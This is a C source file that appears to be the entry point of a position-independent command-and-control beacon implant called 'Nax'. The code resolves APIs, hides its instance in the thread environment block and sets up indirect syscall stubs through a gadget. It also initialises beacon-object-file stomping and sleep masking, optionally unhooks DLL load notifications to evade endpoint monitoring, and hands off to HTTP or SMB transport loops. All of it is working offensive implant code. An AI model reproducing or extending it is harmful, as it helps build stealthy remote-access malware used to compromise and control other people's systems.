/* beacon/src/Main.c
 * NaxMain - PIC beacon entry point (called from Entry.x64.asm).
 *
 * Flow:
 *   1. NaxBootstrap()       resolve APIs, alloc NAX_INSTANCE  (Core/Bootstrap.c)
 *   2. TEB store            instance recoverable via G_INSTANCE anywhere
 *   3. BofStomp + Sleepmask init
 *   4. Dispatch to NaxHttpMain or NaxSmbMain */

#include "Nax.h"
#include "Config.h"
#include "Transport.h"

/* ========= [ NaxMain - beacon entry ] ========= */

FUNC VOID NaxMain( VOID ) {
    PNAX_INSTANCE Nax = NaxBootstrap();
    if ( ! Nax ) return;

    NaxCurrentTeb()->NtTib.ArbitraryUserPointer = Nax;

    /* P1 probe: confirms NaxBootstrap returned (so any sc: line above already
     * ran) and shows the pointers NaxBofStompInit will call FIRST — the first
     * patched-stub invocation (NtAllocateVirtualMemory). If this line does NOT
     * print, the fault is inside NaxBootstrap (NaxSyscallsInit). If it prints
     * then dies, the fault is the first stub call (gadget/SSN).              */
    NaxDbg( Nax, "P1 probe: post-bootstrap NtAllocVM=%p NtProtectVM=%p gadget=%p",
            Nax->Ntdll.NtAllocateVirtualMemory, Nax->Ntdll.NtProtectVirtualMemory,
            Nax->Syscalls.Gadget );

    NaxBofStompInit( Nax );
    NaxSleepmaskInit( Nax );

#if NAX_UNHOOK_DLL_NOTIFY
    NaxDllNotifyUnhookAll( Nax );
#endif

    NaxDbg( Nax, "instance stored in TEB" );
    NaxDbg( Nax, "aes_key: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
            Nax->Config.AesKey[0],  Nax->Config.AesKey[1],  Nax->Config.AesKey[2],  Nax->Config.AesKey[3],
            Nax->Config.AesKey[4],  Nax->Config.AesKey[5],  Nax->Config.AesKey[6],  Nax->Config.AesKey[7],
            Nax->Config.AesKey[8],  Nax->Config.AesKey[9],  Nax->Config.AesKey[10], Nax->Config.AesKey[11],
            Nax->Config.AesKey[12], Nax->Config.AesKey[13], Nax->Config.AesKey[14], Nax->Config.AesKey[15] );

#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
    NaxSmbMain( Nax );
#else
    NaxHttpMain( Nax );
#endif
}

#if defined( DEBUG ) && !defined( DEBUG_PIC )
int main( void ) { NaxMain(); return 0; }
#endif
